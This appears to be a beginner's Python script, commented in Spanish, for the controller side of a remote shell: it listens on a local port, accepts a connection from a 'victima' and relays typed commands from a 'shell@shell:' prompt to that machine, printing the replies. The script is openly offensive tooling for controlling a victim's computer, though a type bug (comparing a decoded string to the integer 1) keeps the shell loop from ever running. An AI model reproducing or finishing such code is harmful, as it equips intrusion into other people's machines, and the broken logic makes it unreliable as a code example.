import socket

server = socket.socket()
server.bind(("localhost", 8080))
server.listen(1)

while True:
    #variables para aceptar coneciones
    victima, direccion =server.accept()
    #obtener el mensaje de la victima en binario
    msBinario = victima.recv(1024)
    #codificar el mensaje
    msCodificado = msBinario.decode('ascii')
    
    if msCodificado == 1:
        while True:
            opciones = input("shell@shell:")
            #Enviar a la victima los mensajes
            victima.send(opciones.encode('ascii'))
            resultado = victima.recv(2048)
            print(resultado)
    else:
        print("errooos..")
        break